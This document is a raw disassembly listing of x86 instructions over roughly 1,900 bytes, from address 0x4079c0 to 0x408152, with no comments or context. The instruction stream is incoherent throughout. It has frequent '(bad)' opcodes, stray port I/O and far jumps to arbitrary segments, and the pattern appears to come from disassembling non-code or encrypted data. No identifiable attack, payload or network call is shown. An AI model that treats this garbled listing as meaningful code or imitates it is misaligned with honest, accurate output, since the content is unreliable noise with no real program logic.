  4079c0:	adc    al,0xae
  4079c2:	bound  ebx,QWORD PTR [esi+0x62a646d9]
  4079c8:	cld    
  4079c9:	jo     0x407a35
  4079cb:	push   ebp
  4079cc:	cmp    BYTE PTR [eax+0x13f1d70c],0x6e
  4079d3:	(bad)  
  4079d4:	mov    ah,0xf9
  4079d6:	xchg   DWORD PTR [eax-0x2c],eax
  4079d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079da:	nop
  4079db:	popf   
  4079dc:	aas    
  4079dd:	daa    
  4079de:	data16 jle 0x4079c4
  4079e1:	ret    0xc889
  4079e4:	dec    ebp
  4079e5:	icebp  
  4079e6:	mov    ebp,ds
  4079e8:	jmp    FWORD PTR cs:[esi+0x3845a340]
  4079ef:	ficom  WORD PTR [edi-0x2e]
  4079f2:	cmp    eax,0xe32200f7
  4079f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079f8:	mov    dl,0xcb
  4079fa:	nop
  4079fb:	cmp    eax,esp
  4079fd:	das    
  4079fe:	leave  
  4079ff:	adc    BYTE PTR [edx],dl
  407a01:	add    BYTE PTR [edx-0x21],bl
  407a04:	cmp    eax,edx
  407a06:	popf   
  407a07:	mov    ds:0xe2e1e384,al
  407a0c:	adc    bh,BYTE PTR [esi-0x7a]
  407a0f:	fwait
  407a10:	outs   dx,DWORD PTR ds:[esi]
  407a11:	add    esp,DWORD PTR [edx+0x7d6fb818]
  407a17:	cmp    edi,edx
  407a19:	and    eax,0x9aa00819
  407a1e:	mov    esi,0x5ff36149
  407a23:	mov    dl,0xc5
  407a25:	jmp    0x9601:0xd88cbb99
  407a2c:	jmp    0xaa96:0x9f76bf5e
  407a33:	cwde   
  407a34:	aam    0xd8
  407a36:	shl    DWORD PTR [ebp-0x54],0x9d
  407a3a:	outs   dx,BYTE PTR es:[esi]
  407a3c:	(bad)  
  407a3d:	jns    0x4079cd
  407a3f:	jl     0x4079c2
  407a41:	or     eax,0x72f6fbf9
  407a46:	cld    
  407a47:	in     al,0xd6
  407a49:	rol    eax,1
  407a4b:	dec    ecx
  407a4c:	int    0x1a
  407a4e:	ins    DWORD PTR es:[edi],dx
  407a4f:	rol    bl,0xb
  407a52:	ret    
  407a53:	add    ebp,DWORD PTR [edx-0x6a]
  407a56:	les    edi,FWORD PTR [ebx-0x61]
  407a59:	mov    ebx,0xba01aac7
  407a5e:	arpl   WORD PTR [edi],ax
  407a60:	xchg   esi,eax
  407a61:	(bad)  
  407a62:	mul    BYTE PTR [edi-0x5de87f6f]
  407a68:	cmp    eax,0xfde9553
  407a6d:	outs   dx,DWORD PTR ds:[esi]
  407a6e:	xchg   edi,eax
  407a6f:	test   DWORD PTR [ecx-0x6a],esp
  407a72:	or     DWORD PTR [ebp-0x1d],ebp
  407a75:	stos   BYTE PTR es:[edi],al
  407a76:	daa    
  407a77:	stos   DWORD PTR es:[edi],eax
  407a78:	push   edx
  407a79:	jmp    cx
  407a7c:	mov    ?,ebx
  407a7e:	cmp    DWORD PTR [eax+0x42],edi
  407a81:	sub    DWORD PTR [eax+0x7],edi
  407a84:	fxch   st(1)
  407a86:	test   edx,edx
  407a88:	mov    bh,0x75
  407a8a:	add    DWORD PTR [esi],0xe78f3637
  407a90:	inc    DWORD PTR [ebx+0x103c4efd]
  407a96:	loop   0x407a47
  407a98:	imul   esp,esi,0xc7539b67
  407a9e:	jae    0x407b16
  407aa0:	clc    
  407aa1:	adc    BYTE PTR [ebp+0x52583061],bl
  407aa7:	mov    ds:0x8ab319f5,al
  407aac:	(bad)  
  407aad:	es retf 0xc558
  407ab1:	adc    eax,0x65a550c7
  407ab6:	jae    0x407a71
  407ab8:	jge    0x407b05
  407aba:	pop    ebx
  407abb:	out    dx,al
  407abc:	fist   DWORD PTR [edi+0x3d66ef92]
  407ac2:	data16 mov dl,BYTE PTR [eax+eiz*4+0x4ed61edf]
  407aca:	ss adc al,0xec
  407acd:	mov    ch,0xea
  407acf:	dec    ebx
  407ad0:	pop    eax
  407ad1:	jb     0x407afe
  407ad3:	or     DWORD PTR [esi],ebp
  407ad5:	jnp    0x407ab1
  407ad7:	gs jmp 0x407b34
  407ada:	push   edx
  407adb:	inc    eax
  407adc:	xor    DWORD PTR [edx-0x1be68065],eax
  407ae2:	hlt    
  407ae3:	inc    eax
  407ae4:	in     eax,0x9d
  407ae6:	js     0x407ac0
  407ae8:	adc    DWORD PTR [ebx+eiz*4+0x18d86ff8],edi
  407aef:	sub    al,0x37
  407af1:	ins    DWORD PTR es:[edi],dx
  407af2:	jmp    0xcde8:0x84bbde39
  407af9:	sbb    ebp,edi
  407afb:	(bad)  [eax-0x61]
  407afe:	out    dx,al
  407aff:	push   ebp
  407b00:	push   edi
  407b01:	inc    ebx
  407b02:	sub    BYTE PTR [eax-0xb],ah
  407b05:	or     bh,BYTE PTR [esp+eax*4-0x30cb4903]
  407b0c:	mov    WORD PTR [ecx],ss
  407b0e:	push   ecx
  407b0f:	push   ebx
  407b10:	jns    0x407b13
  407b12:	cmp    ah,BYTE PTR [ecx+0x39]
  407b15:	or     ah,BYTE PTR [esi-0x51]
  407b18:	ds jmp 0xbc9e:0x31540e7e
  407b20:	jecxz  0x407b88
  407b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b23:	or     BYTE PTR [edi],0x5c
  407b26:	sub    al,0xee
  407b28:	pusha  
  407b29:	test   DWORD PTR [ebx-0x6f],edi
  407b2c:	outs   dx,DWORD PTR ds:[esi]
  407b2d:	out    0x76,eax
  407b2f:	(bad)  
  407b31:	pop    edx
  407b32:	cwde   
  407b33:	pop    ebx
  407b34:	ins    DWORD PTR es:[edi],dx
  407b35:	inc    esp
  407b36:	outs   dx,BYTE PTR ds:[esi]
  407b37:	inc    ebp
  407b38:	stos   BYTE PTR es:[edi],al
  407b39:	mov    fs,WORD PTR [edi-0x34]
  407b3c:	inc    ecx
  407b3d:	mov    al,ds:0x8ffb2a02
  407b42:	mov    ebx,0x8ae181b9
  407b47:	jae    0x407ba1
  407b49:	int3   
  407b4a:	jge    0x407b4e
  407b4c:	dec    edx
  407b4d:	sti    
  407b4e:	mov    al,ds:0xb22dc198
  407b53:	push   ebp
  407b54:	mov    ds:0x9e4062a1,al
  407b59:	xchg   edi,eax
  407b5a:	push   ecx
  407b5b:	jno    0x407b3d
  407b5d:	ret    
  407b5e:	xchg   ebp,eax
  407b5f:	cdq    
  407b60:	mov    dh,0x24
  407b62:	lock mov ebp,0xe94208d5
  407b68:	push   cs
  407b69:	ficom  WORD PTR [eax-0xb7ec8e3]
  407b6f:	push   esi
  407b70:	lods   eax,DWORD PTR ds:[esi]
  407b71:	add    edx,DWORD PTR [ebp+0x7798bf35]
  407b77:	push   0xb5e31bb1
  407b7c:	jmp    0x407b21
  407b7e:	sub    al,0x5d
  407b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b81:	in     al,0x6
  407b83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b84:	std    
  407b85:	xchg   edx,eax
  407b86:	lods   al,BYTE PTR ds:[esi]
  407b87:	rcr    DWORD PTR ds:0xe2cd09df,0xd3
  407b8e:	aad    0x4f
  407b90:	cdq    
  407b91:	mov    dh,0x6b
  407b93:	xchg   DWORD PTR [edx+0x1a5d9c7f],ebp
  407b99:	lds    eax,FWORD PTR [ebx+0x67]
  407b9c:	fstp   QWORD PTR [ebp-0x6d]
  407b9f:	and    eax,DWORD PTR [esi+eiz*2-0x2e]
  407ba3:	lods   al,BYTE PTR ds:[esi]
  407ba4:	mov    gs,WORD PTR [ecx+0x6f412057]
  407baa:	dec    ebx
  407bab:	in     al,0x4d
  407bad:	test   al,0x52
  407baf:	or     eax,0xc846b8de
  407bb4:	call   0xc2e:0xe7036b9d
  407bbb:	es sahf 
  407bbd:	pop    ds
  407bbe:	push   edx
  407bbf:	push   esi
  407bc0:	sub    eax,0x6d4efccc
  407bc5:	add    al,0x1e
  407bc7:	xchg   esp,eax
  407bc8:	xchg   edx,eax
  407bc9:	and    bl,ch
  407bcb:	call   0x4f5b:0x9a6bba55
  407bd2:	xor    ebx,DWORD PTR [edx-0x18]
  407bd5:	jmp    0x407c12
  407bd7:	gs push ecx
  407bd9:	pushf  
  407bda:	mov    edx,ebx
  407bdc:	inc    eax
  407bdd:	inc    eax
  407bde:	mov    DWORD PTR [edx-0x35088a33],ebp
  407be4:	dec    eax
  407be5:	pop    edi
  407be6:	pop    ebp
  407be7:	mov    cl,0x41
  407be9:	xchg   ecx,eax
  407bea:	mov    ch,BYTE PTR [edx]
  407bec:	pop    ecx
  407bed:	clc    
  407bee:	bound  edx,QWORD PTR [ebp-0x29c44f78]
  407bf4:	dec    edx
  407bf5:	cs stc 
  407bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bf8:	cwde   
  407bf9:	xchg   edi,eax
  407bfa:	and    BYTE PTR [esp+eax*1],dl
  407bfd:	out    dx,eax
  407bfe:	cdq    
  407bff:	and    eax,0x63017dda
  407c04:	repnz push edi
  407c06:	les    edx,FWORD PTR [eax]
  407c08:	or     DWORD PTR [esi+0x49ee82d1],ebx
  407c0e:	push   ebp
  407c0f:	jbe    0x407c2a
  407c11:	or     BYTE PTR [esi+0x3d],dl
  407c14:	(bad)  
  407c15:	pop    esp
  407c16:	lahf   
  407c17:	aaa    
  407c18:	jmp    0x407c81
  407c1a:	sbb    eax,0x9e9f930d
  407c1f:	test   DWORD PTR [edx+ebx*8+0x2ea967e3],edi
  407c26:	push   edx
  407c27:	and    al,0xbc
  407c29:	ins    DWORD PTR es:[edi],dx
  407c2a:	xchg   edx,eax
  407c2b:	(bad)  
  407c2c:	je     0x407c48
  407c2e:	sbb    eax,0xf131eafe
  407c33:	cmp    eax,0x4bc2ea7
  407c38:	repnz pop esi
  407c3a:	push   edi
  407c3b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c3d:	and    esp,DWORD PTR [edi]
  407c3f:	add    eax,0xbdb86d58
  407c44:	mov    ax,0xd7b3
  407c48:	mov    dh,0xea
  407c4a:	jecxz  0x407c34
  407c4c:	cdq    
  407c4d:	jne    0x407beb
  407c4f:	in     eax,dx
  407c50:	loope  0x407c5c
  407c52:	dec    edx
  407c53:	jbe    0x407ccf
  407c55:	adc    al,0xf8
  407c57:	in     al,0x2f
  407c59:	dec    ebx
  407c5a:	sbb    ah,dh
  407c5c:	mov    al,0xf
  407c5e:	adc    edx,esp
  407c60:	adc    BYTE PTR [edi+ebx*4],ah
  407c63:	inc    edx
  407c64:	push   edi
  407c65:	cli    
  407c66:	dec    ecx
  407c67:	and    DWORD PTR [ecx],edx
  407c69:	das    
  407c6a:	inc    ecx
  407c6b:	xor    BYTE PTR [ebx-0x16],ch
  407c6e:	inc    ecx
  407c6f:	mov    DWORD PTR [ebx+0x32],eax
  407c72:	and    esp,esi
  407c74:	push   edx
  407c75:	sar    DWORD PTR [edx-0x124d3101],cl
  407c7b:	jmp    0x407caa
  407c7d:	cmp    DWORD PTR [ebx+0x2dc3f727],edx
  407c83:	clc    
  407c84:	enter  0x99bf,0x6
  407c88:	mov    ds:0x5d563bc8,al
  407c8d:	fstp   DWORD PTR [eax-0x5ac96c64]
  407c93:	int    0xc5
  407c95:	into   
  407c96:	addr16 mov ah,0x96
  407c99:	js     0x407ca7
  407c9b:	inc    esp
  407c9c:	adc    al,0x76
  407c9e:	inc    edi
  407c9f:	and    BYTE PTR [eax-0x209a9974],cl
  407ca5:	fisubr WORD PTR [ecx+0x1f]
  407ca8:	arpl   WORD PTR [eax-0x13],di
  407cab:	cmc    
  407cac:	mov    al,ds:0x5f4148ac
  407cb1:	cmp    al,0xd2
  407cb3:	add    BYTE PTR [edi],dh
  407cb5:	jp     0x407cfe
  407cb7:	pop    edi
  407cb8:	retf   0x4cab
  407cbb:	inc    ecx
  407cbc:	jns    0x407c66
  407cbe:	out    dx,al
  407cbf:	dec    DWORD PTR [ebx]
  407cc1:	shl    BYTE PTR [edx],0x8d
  407cc4:	add    BYTE PTR [ebx+0x50],0xf2
  407cc8:	stos   BYTE PTR es:[edi],al
  407cc9:	loope  0x407c93
  407ccb:	dec    ebx
  407ccc:	mov    edi,0x936c7c39
  407cd1:	fadd   st(5),st
  407cd3:	cmp    al,0x17
  407cd5:	mov    WORD PTR [eax],?
  407cd7:	sub    al,BYTE PTR [esi]
  407cd9:	xchg   ebp,eax
  407cda:	push   ds
  407cdb:	stc    
  407cdc:	loopne 0x407c9d
  407cde:	aad    0x20
  407ce0:	popf   
  407ce1:	hlt    
  407ce2:	sbb    BYTE PTR [eax],al
  407ce4:	ja     0x407d21
  407ce6:	sbb    dl,BYTE PTR [esi*4-0x569b5f2b]
  407ced:	into   
  407cee:	xor    eax,0x74c79889
  407cf3:	shl    BYTE PTR [esi+0x76],0xef
  407cf7:	(bad)  
  407cf8:	cmp    ebx,DWORD PTR [eax]
  407cfa:	fistp  WORD PTR ds:0x5cb521b1
  407d00:	jae    0x407d25
  407d02:	mov    edi,0xe3f719be
  407d07:	inc    eax
  407d08:	icebp  
  407d09:	arpl   dx,sp
  407d0b:	mov    al,ds:0x62826e93
  407d10:	(bad)  
  407d11:	dec    ebx
  407d12:	mov    dl,0xa9
  407d14:	mov    bl,0x83
  407d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d17:	call   FWORD PTR [ecx]
  407d19:	push   edx
  407d1a:	dec    edx
  407d1b:	pusha  
  407d1c:	jle    0x407d2b
  407d1e:	out    dx,eax
  407d1f:	pop    edi
  407d20:	mov    edx,0x8ee491cd
  407d25:	inc    esp
  407d26:	and    al,0xc4
  407d28:	out    0xae,eax
  407d2a:	cld    
  407d2b:	push   esi
  407d2c:	pop    ds
  407d2d:	(bad)  
  407d2e:	stos   DWORD PTR es:[edi],eax
  407d2f:	pop    esp
  407d30:	sub    DWORD PTR [esi+edi*4-0x7e],esi
  407d34:	ret    0x1915
  407d37:	sbb    DWORD PTR [edx],edi
  407d39:	aas    
  407d3a:	add    bh,BYTE PTR [esi]
  407d3c:	push   ebp
  407d3d:	pop    ds
  407d3e:	lods   al,BYTE PTR ds:[esi]
  407d3f:	pop    eax
  407d40:	pop    ebx
  407d41:	inc    esi
  407d42:	out    0x9f,al
  407d44:	and    eax,0x1f99d738
  407d49:	stc    
  407d4a:	cwde   
  407d4b:	mov    ds:0xdf87c4c0,al
  407d50:	inc    edi
  407d51:	imul   esp,DWORD PTR [esi+0x53],0xfffffff1
  407d55:	inc    edx
  407d56:	or     BYTE PTR [ebx+ecx*2],bh
  407d59:	pop    eax
  407d5a:	shl    DWORD PTR [ecx],0xe0
  407d5d:	popf   
  407d5e:	sbb    ah,BYTE PTR [ebx]
  407d60:	inc    edx
  407d61:	add    eax,0x87113cc8
  407d66:	loop   0x407d15
  407d68:	ret    
  407d69:	jb     0x407d95
  407d6b:	in     al,dx
  407d6c:	or     eax,0x195bab0c
  407d71:	xchg   DWORD PTR [eax+0x62],esp
  407d74:	imul   esi,DWORD PTR [edx],0x2d2169
  407d7a:	loopne 0x407de8
  407d7c:	jmp    0xa9367ad6
  407d81:	jecxz  0x407d60
  407d83:	mov    cl,0xb9
  407d85:	mov    eax,0x4279d1e3
  407d8a:	sub    al,0x8
  407d8c:	push   eax
  407d8d:	jg     0x407d3b
  407d8f:	ffree  st(1)
  407d91:	popf   
  407d92:	addr16 inc eax
  407d94:	out    dx,al
  407d95:	(bad)  
  407d96:	mov    ds:0xaec3d578,al
  407d9b:	add    eax,0x6c829708
  407da0:	je     0x407d59
  407da2:	addr16 mov ebx,0x9fc40a0a
  407da8:	aas    
  407da9:	or     DWORD PTR [edx-0x7c],0x33
  407dad:	cmp    al,0x37
  407daf:	dec    ecx
  407db0:	int3   
  407db1:	std    
  407db2:	add    eax,0x7c6a4c6
  407db7:	lds    esp,FWORD PTR [edx+0x7299741e]
  407dbd:	push   eax
  407dbe:	add    dl,BYTE PTR [edx]
  407dc0:	sub    dl,dl
  407dc2:	xor    al,al
  407dc4:	out    dx,eax
  407dc5:	jb     0x407d5e
  407dc7:	inc    esp
  407dc8:	pop    ecx
  407dc9:	or     BYTE PTR [ebx+0x6d],0x2b
  407dcd:	std    
  407dce:	jb     0x407db0
  407dd0:	sbb    DWORD PTR [ecx+0x333dd85],0x6ce95f5d
  407dda:	add    al,0x71
  407ddc:	and    esp,DWORD PTR [esi-0x3a]
  407ddf:	dec    esi
  407de0:	repz pop ecx
  407de2:	dec    esi
  407de3:	cmc    
  407de4:	enter  0x7b75,0xc
  407de8:	xchg   ebx,eax
  407de9:	adc    dh,BYTE PTR [edx]
  407deb:	add    ch,BYTE PTR [ecx+edi*8-0x59]
  407def:	or     eax,esi
  407df1:	pop    ebp
  407df2:	jne    0x407db6
  407df4:	pop    ebp
  407df5:	xchg   edi,eax
  407df6:	lds    eax,FWORD PTR [esi+ecx*4-0x18e221b8]
  407dfd:	or     DWORD PTR [ecx+0xe51b28e],ebx
  407e03:	jmp    0xb311:0x701fa3a5
  407e0a:	mov    edi,0xb8815037
  407e0f:	jmp    0xc5b9da16
  407e14:	ins    DWORD PTR es:[edi],dx
  407e15:	dec    esi
  407e16:	dec    ebp
  407e17:	or     eax,0x20e18b31
  407e1c:	push   esp
  407e1d:	call   0x4e630bc4
  407e22:	test   dh,bh
  407e24:	out    0x65,eax
  407e26:	cmp    esp,DWORD PTR [ebx-0x38572944]
  407e2c:	or     BYTE PTR [edi],ah
  407e2e:	or     ebx,edi
  407e30:	fdivr  DWORD PTR [eax+0x769f31be]
  407e36:	test   al,0x4f
  407e38:	push   esi
  407e39:	dec    edx
  407e3a:	stos   BYTE PTR es:[edi],al
  407e3b:	mov    ds:0xc4ffdd44,eax
  407e40:	cmc    
  407e41:	inc    eax
  407e42:	inc    ebp
  407e43:	and    al,0x68
  407e45:	test   al,0xe2
  407e47:	test   eax,0x3197ec11
  407e4c:	push   cs
  407e4d:	cmp    eax,ebx
  407e4f:	xor    cl,ch
  407e51:	mov    DWORD PTR [eax],esp
  407e53:	fild   WORD PTR [edx+0x29aad3b7]
  407e59:	xor    esi,ebx
  407e5b:	loop   0x407e68
  407e5d:	or     al,0x2c
  407e5f:	cmp    BYTE PTR [esi],0x34
  407e62:	sub    eax,0x336417b7
  407e67:	inc    esp
  407e68:	adc    al,0x4a
  407e6a:	sbb    bl,BYTE PTR es:[edi+0x301bd457]
  407e71:	jge    0x407ed6
  407e73:	div    DWORD PTR [ecx]
  407e75:	popf   
  407e76:	cmp    eax,0x4b5eb22
  407e7b:	fsubp  st(3),st
  407e7d:	and    bl,BYTE PTR [edi]
  407e7f:	and    dl,BYTE PTR [edi-0x1f]
  407e82:	sub    BYTE PTR [edx],ah
  407e84:	push   esp
  407e85:	(bad)
  407e88:	cli    
  407e89:	jg     0x407e4c
  407e8b:	retf   
  407e8c:	mov    esp,DWORD PTR [ecx-0x50]
  407e8f:	pusha  
  407e90:	add    al,0x8
  407e92:	jmp    0x766e:0x979b019b
  407e99:	push   ss
  407e9a:	(bad)  
  407e9b:	daa    
  407e9c:	cmp    al,0x23
  407e9e:	adc    DWORD PTR [ecx+0x7071fad4],ebx
  407ea4:	in     eax,0xc6
  407ea6:	xor    bl,BYTE PTR [esi]
  407ea8:	jge    0x407ea5
  407eaa:	pop    ds
  407eab:	and    al,0x2c
  407ead:	or     bh,BYTE PTR ds:0xf22be211
  407eb3:	out    dx,al
  407eb4:	lock push edi
  407eb6:	xor    BYTE PTR [esi+0x2095ae54],dl
  407ebc:	lods   al,BYTE PTR ds:[esi]
  407ebd:	stos   DWORD PTR es:[edi],eax
  407ebe:	mov    WORD PTR [edi+eax*8],ds
  407ec1:	cdq    
  407ec2:	or     al,0xb9
  407ec4:	(bad)  
  407ec5:	neg    cl
  407ec7:	mov    al,0x77
  407eca:	inc    esp
  407ecb:	sub    eax,0x69eab5e4
  407ed0:	test   al,0x47
  407ed2:	mov    esp,0x5be1c8b1
  407ed7:	xchg   BYTE PTR [eax],dh
  407ed9:	inc    eax
  407eda:	jecxz  0x407ee6
  407edc:	mov    al,0x77
  407ede:	push   ebp
  407edf:	dec    ebp
  407ee0:	adc    DWORD PTR [ebx-0x5a],ebp
  407ee3:	addr16 jnp 0x407f32
  407ee6:	les    ebx,FWORD PTR [ebx+edx*2]
  407ee9:	sub    BYTE PTR [ebx+0x53],dh
  407eec:	inc    ecx
  407eed:	fs scas al,BYTE PTR es:[edi]
  407eef:	mov    WORD PTR [esi],ss
  407ef1:	jmp    0xd876:0x305b0478
  407ef8:	mov    cl,0x23
  407efa:	xor    al,0x4d
  407efc:	or     BYTE PTR [esi-0x550b3e02],bh
  407f02:	sti    
  407f03:	xchg   ebx,eax
  407f04:	(bad)
  407f08:	inc    ebp
  407f09:	jo     0x407ea1
  407f0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f0c:	dec    edi
  407f0d:	in     eax,dx
  407f0e:	adc    dh,dl
  407f10:	ficomp DWORD PTR [ecx]
  407f12:	outs   dx,DWORD PTR ds:[esi]
  407f13:	inc    esi
  407f14:	pop    ds
  407f15:	test   al,0x2f
  407f17:	in     al,dx
  407f18:	mov    esp,eax
  407f1a:	mov    edx,DWORD PTR [ebp+0x3d]
  407f1d:	bound  ebx,QWORD PTR [edx-0x1f87e5c4]
  407f23:	inc    ecx
  407f24:	std    
  407f25:	sbb    DWORD PTR [ebx],0x8ee2fa2f
  407f2b:	cs pop es
  407f2d:	sbb    eax,0x40137980
  407f32:	leave  
  407f33:	push   ebx
  407f34:	fs cmp al,0xa9
  407f37:	sar    edi,1
  407f39:	and    eax,0x329fbbd6
  407f3e:	jle    0x407ef5
  407f40:	test   BYTE PTR [edx-0xd4d17fb],0xc3
  407f47:	mov    ah,BYTE PTR [edi-0x70]
  407f4a:	sbb    DWORD PTR [ebx+0x4e],esp
  407f4d:	inc    ebp
  407f4e:	jmp    0x3e48:0x9c3a9286
  407f55:	stc    
  407f56:	mov    ds:0x8b093693,eax
  407f5b:	dec    ebx
  407f5c:	sub    ch,BYTE PTR [edi+esi*2]
  407f5f:	mov    esp,0x3106d14b
  407f64:	mov    esi,0xb92dad9b
  407f69:	inc    edi
  407f6a:	cwde   
  407f6b:	inc    ebp
  407f6c:	aas    
  407f6d:	xor    bh,BYTE PTR [edi-0x6a2d3b73]
  407f73:	sub    eax,0x2bfbec71
  407f78:	inc    ebp
  407f79:	aam    0xe5
  407f7b:	data16 jno 0x407f2d
  407f7e:	out    dx,al
  407f7f:	mov    BYTE PTR [ecx-0x28],ah
  407f82:	rcl    ch,0xf
  407f85:	xchg   BYTE PTR [ecx-0x6d],ch
  407f88:	je     0x407f80
  407f8a:	push   ds
  407f8b:	mov    ebx,0x7775c414
  407f90:	pop    edx
  407f91:	and    eax,0xa72f92ed
  407f96:	imul   ebp,DWORD PTR [ebp-0x3d],0x71
  407f9a:	out    0xaf,al
  407f9c:	cld    
  407f9d:	(bad)  
  407f9e:	dec    edx
  407f9f:	in     eax,0x33
  407fa1:	aam    0x7c
  407fa3:	ins    BYTE PTR es:[edi],dx
  407fa4:	adc    al,0x51
  407fa6:	loopne 0x407f6d
  407fa8:	gs and al,0x1
  407fab:	shl    ecx,cl
  407fad:	or     cl,cl
  407faf:	xchg   edx,eax
  407fb0:	scas   al,BYTE PTR es:[edi]
  407fb1:	pop    ss
  407fb2:	sbb    eax,0x7d43ff9e
  407fb7:	pop    ds
  407fb8:	int3   
  407fb9:	inc    ebx
  407fba:	pop    edi
  407fbb:	je     0x407fdc
  407fbd:	mov    bh,0xe4
  407fbf:	push   edi
  407fc0:	sar    DWORD PTR [ebp-0x64],1
  407fc3:	push   es
  407fc4:	or     bh,0xf1
  407fc7:	fs sub al,ah
  407fca:	sbb    ecx,eax
  407fcc:	mov    ebp,0x3924e6c8
  407fd1:	shl    BYTE PTR [edx-0x1e],cl
  407fd4:	cmp    al,0xc0
  407fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fd7:	loop   0x407fd9
  407fd9:	cmp    bl,cl
  407fdb:	lods   eax,DWORD PTR ds:[esi]
  407fdc:	jne    0x407f7e
  407fde:	les    eax,FWORD PTR [ecx-0x6afa10fe]
  407fe4:	cwde   
  407fe5:	jmp    0x9676aae8
  407fea:	jmp    0x407fe1
  407fec:	nop
  407fed:	call   0xd570ffb6
  407ff2:	ins    DWORD PTR es:[edi],dx
  407ff3:	jl     0x408007
  407ff5:	fsubr  DWORD PTR [esi]
  407ff7:	add    ecx,DWORD PTR [edx]
  407ff9:	lock stos BYTE PTR es:[edi],al
  407ffb:	jle    0x408037
  407ffd:	es daa 
  407fff:	pop    edi
  408000:	adc    ecx,DWORD PTR [edx+0x13d2c88f]
  408006:	xchg   ebp,eax
  408007:	call   0x722b:0x9fe9498
  40800e:	imul   ebp,DWORD PTR [edi+0x36],0xfffffff0
  408012:	xchg   edx,eax
  408013:	pop    ebp
  408014:	call   0xbd17:0x4d3aaa9b
  40801b:	fstp   DWORD PTR [eax]
  40801d:	jmp    0x408055
  40801f:	adc    BYTE PTR ds:0x5882da88,dl
  408025:	in     al,dx
  408026:	xchg   esi,eax
  408027:	mov    dl,0x25
  408029:	aaa    
  40802a:	jmp    0xe905f631
  40802f:	enter  0xda4b,0x3
  408033:	xor    al,0x55
  408035:	push   ds
  408036:	outs   dx,BYTE PTR ds:[esi]
  408037:	push   ebp
  408038:	and    dl,BYTE PTR ds:0x1a0d9c72
  40803e:	dec    ecx
  40803f:	add    al,BYTE PTR [edi-0x67902193]
  408045:	daa    
  408046:	add    al,BYTE PTR [ebx+0x2a]
  408049:	mov    ch,0x16
  40804b:	pop    ebp
  40804c:	jae    0x407ff2
  40804e:	shr    cl,cl
  408050:	out    0x72,eax
  408052:	pop    esi
  408053:	aam    0x3a
  408055:	push   ss
  408056:	inc    esp
  408057:	jl     0x408036
  408059:	mov    esp,0x2dd89ccb
  40805e:	pop    esi
  40805f:	int    0xf2
  408061:	cwde   
  408062:	push   ebp
  408063:	mov    ah,0xc2
  408065:	xchg   edx,eax
  408066:	xor    al,0x17
  408068:	fisub  WORD PTR [edi+0x71d31488]
  40806e:	ret    
  40806f:	pop    esi
  408070:	cs push eax
  408072:	jno    0x4080d9
  408074:	and    ebx,esp
  408076:	call   0x274d:0xb67dbe46
  40807d:	call   0xf716:0x467a5933
  408084:	stc    
  408085:	push   ebp
  408086:	xchg   ecx,eax
  408087:	jbe    0x408065
  408089:	mov    esi,0x10045966
  40808e:	sbb    cl,ah
  408090:	outs   dx,DWORD PTR ds:[esi]
  408091:	push   ds
  408092:	xchg   esp,eax
  408093:	pop    ss
  408094:	push   ebp
  408095:	xor    al,0x6e
  408097:	mov    bl,0xf3
  408099:	dec    esi
  40809a:	or     bh,BYTE PTR [ebx]
  40809c:	das    
  40809d:	std    
  40809e:	(bad)  
  40809f:	iret   
  4080a0:	ins    DWORD PTR es:[edi],dx
  4080a1:	loopne 0x408046
  4080a3:	pop    esi
  4080a4:	shl    BYTE PTR [edi+0x78],0xb6
  4080a8:	or     DWORD PTR es:[ebp+0x2982f61e],0xffffff86
  4080b0:	push   ds
  4080b1:	xchg   ebx,eax
  4080b2:	or     esp,edi
  4080b4:	leave  
  4080b5:	add    BYTE PTR [edi+eiz*4],dl
  4080b8:	scas   eax,DWORD PTR es:[edi]
  4080b9:	and    al,0x73
  4080bb:	push   cs
  4080bc:	pop    esi
  4080bd:	jmp    0x408053
  4080bf:	cld    
  4080c0:	pop    edi
  4080c1:	stc    
  4080c2:	in     al,0x3b
  4080c4:	imul   ebp,DWORD PTR [ecx],0xffffffa9
  4080c7:	es push cs
  4080c9:	adc    ebx,ecx
  4080cb:	pusha  
  4080cc:	push   0xfffffff2
  4080ce:	pop    ebx
  4080cf:	test   eax,0x1447beb7
  4080d4:	jmp    0xa43b8f01
  4080d9:	xchg   ebp,eax
  4080da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080db:	in     al,0xfa
  4080dd:	dec    edx
  4080de:	daa    
  4080df:	fwait
  4080e0:	outs   dx,BYTE PTR ds:[esi]
  4080e1:	mov    esp,0x4b049d7d
  4080e6:	repz push esi
  4080e8:	sbb    BYTE PTR ds:0x935de4ef,ah
  4080ee:	push   0xffffffd3
  4080f0:	sbb    DWORD PTR [esi],esi
  4080f2:	pop    ecx
  4080f3:	scas   al,BYTE PTR es:[edi]
  4080f4:	addr16 jg 0x40809a
  4080f7:	mov    edi,0xbb837b57
  4080fc:	retf   0x7ab5
  4080ff:	fdivr  QWORD PTR [ebp+0x1aeb1e99]
  408105:	cmp    ch,BYTE PTR [ecx-0x198e33]
  40810b:	mov    bh,0x7a
  40810d:	and    DWORD PTR [edi-0x5c67da01],esp
  408113:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408114:	outs   dx,DWORD PTR ds:[esi]
  408115:	jnp    0x408151
  408117:	ficom  DWORD PTR [ebp+eiz*2-0x7a4824da]
  40811e:	call   0x5323:0xbc4ebcf0
  408125:	inc    eax
  408126:	mov    ds:0x5281ce8e,eax
  40812b:	mov    ecx,0x15edd4b0
  408130:	mov    bh,0xfa
  408132:	leave  
  408133:	mov    eax,0xcfd6918b
  408138:	add    BYTE PTR [bp+si-0x2f],dl
  40813c:	test   BYTE PTR [ebp-0x1414e28c],cl
  408142:	retf   0xcd98
  408145:	cmp    DWORD PTR [eax+ebp*1-0x78],esp
  408149:	ins    DWORD PTR es:[edi],dx
  40814a:	fld    QWORD PTR [ebp+ecx*1+0x6c]
  40814e:	(bad)  
  40814f:	xchg   ebp,eax
  408150:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  408152:	dec    ecx
